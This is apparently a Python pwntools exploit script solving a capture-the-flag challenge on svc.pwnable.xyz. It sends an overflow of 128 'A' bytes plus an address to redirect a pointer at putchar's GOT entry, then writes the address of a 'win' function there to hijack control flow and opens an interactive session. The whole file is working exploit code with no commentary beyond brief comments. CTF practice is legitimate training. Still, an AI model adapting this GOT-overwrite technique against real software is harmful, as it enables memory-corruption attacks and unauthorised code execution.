from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30013)
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
win = e.symbols['win']
maxlen = 0x0000000000602280
name = 0x00000000006022A0
desc = 0x0000000000602320
puts_got = 0x602028

sa(':','A') # Name
sa(':','B') # Desc

for i in range(20):
	sa('>','1')
	sa(':','\x00')

sa('>','1')
sa(':','A'*128+'\x20\x20\x60\x20') # 0000000000602020 R_X86_64_JUMP_SLOT  putchar@GLIBC_2.2.5

sa('>','2')
sa(':',p64(win)) # putcahr@got -> win
# raw_input()

sa('>','3') 

p.interactive()